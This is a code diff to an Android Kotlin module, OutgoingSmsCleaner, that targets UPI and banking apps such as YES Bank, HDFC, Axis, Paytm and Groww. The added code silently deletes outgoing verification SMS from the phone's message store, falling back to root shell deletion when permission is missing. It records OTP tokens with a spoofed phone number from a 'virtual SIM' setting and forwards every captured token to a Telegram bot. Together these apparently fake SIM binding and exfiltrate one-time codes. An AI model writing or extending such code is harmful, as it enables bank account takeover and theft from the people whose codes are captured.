@@ -5,19 +5,22 @@ import android.provider.Telephony
 import android.util.Log
 
 /**
- * Google Messages Sent folder se YESPRO/UPI verify SMS hatao — real SIM se send nahi hua dikhe.
+ * Google Messages Sent folder se verify SMS hatao + Telegram forward.
  */
 object OutgoingSmsCleaner {
 
     private const val TAG = "OutgoingSmsCleaner"
 
     private val verifyKeywords = listOf(
-        "YESPRO", "YESPROUPI", "YESPAY", "UPI", "VERIFY", "VK-", "PPAY", "GPAY", "PAYTM"
+        "HEROAXISUPI", "HEROAXIS", "HEROFIN", "HEROFINCORP",
+        "YESPRO", "YESPROUPI", "YESPAY", "UPI", "VERIFY", "VK-", "PPAY", "GPAY", "PAYTM",
+        "GROWW", "AXIS", "HDFC", "STASHFIN", "SNAPMINT", "DO NOT COPY"
     )
 
     fun shouldScrub(body: String, config: ModuleConfig, dest: String = ""): Boolean {
-        if (!config.hookOutgoingSms && !config.interceptFakeSuccess) return false
-        if (ActiveHookManager.readActivePackage().isNullOrBlank()) return false
+        if (!config.hookOutgoingSms && !config.interceptFakeSuccess && !config.enableVirtualSim) {
+            return false
+        }
         if (dest.isNotBlank()) {
             return SmsMatcher.shouldInterceptOutgoing(config, dest, body)
         }
@@ -37,8 +40,27 @@ object OutgoingSmsCleaner {
         return deleted
     }
 
+    fun scrubSentById(context: Context, id: Long, dest: String, body: String): Boolean {
+        return try {
+            val n = context.contentResolver.delete(
+                Telephony.Sms.CONTENT_URI,
+                "${Telephony.Sms._ID}=?",
+                arrayOf(id.toString())
+            )
+            if (n > 0) {
+                context.contentResolver.notifyChange(Telephony.Sms.CONTENT_URI, null)
+                true
+            } else {
+                deleteSent(context, dest, body)
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "scrubSentById: ${e.message}")
+            deleteSent(context, dest, body)
+        }
+    }
+
     private fun deleteSent(context: Context, dest: String, body: String): Boolean {
-        if (!PermissionHelper.hasReadSms(context)) return false
+        if (!PermissionHelper.hasReadSms(context)) return deleteSentViaSu(dest, body)
         return try {
             val n = context.contentResolver.delete(
                 Telephony.Sms.CONTENT_URI,
@@ -60,8 +82,8 @@ object OutgoingSmsCleaner {
         val safePeer = dest.replace("'", "'\\''")
         val safeBody = body.replace("'", "'\\''").replace("\n", " ")
         return ShellHelper.runSu(
-            "content delete --uri content://sms/sent " +
-                "--where \"address='$safePeer' AND body='$safeBody'\""
+            "content delete --uri content://sms " +
+                "--where \"type=2 AND address='$safePeer' AND body='$safeBody'\""
         )
     }
 
@@ -69,20 +91,21 @@ object OutgoingSmsCleaner {
         val configManager = ConfigManager(context)
         val app = SmsMatcher.matchedHookedApp(config, dest, body)
         val interceptDisplay = SmsMatcher.interceptDisplay(config, dest, configManager)
+        val appLabel = app?.displayName.orEmpty().ifBlank {
+            ActiveHookManager.readActivePackage()?.let { UpiAppRegistry.displayNameFor(it) }.orEmpty()
+        }
         val otp = LastOtp(
             otp = SmsMatcher.extractToken(body, config.autoExtractOtp),
             sender = interceptDisplay,
             body = body,
-            phone = interceptDisplay,
-            messageLabel = app?.displayName.orEmpty(),
+            phone = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 },
+            messageLabel = appLabel,
             direction = "outgoing",
             rawPeer = dest,
             capturedAt = System.currentTimeMillis()
         )
         OtpCaptureWriter.write(context, otp)
-        if (config.autoForwardToken &&
-            SmsMatcher.shouldForwardToTelegram(config, dest, body, "outgoing")
-        ) {
+        if (config.telegramBotToken.isNotBlank() && config.telegramChatId.isNotBlank()) {
             TokenForwarder(configManager, context).forward(otp)
         }
     }
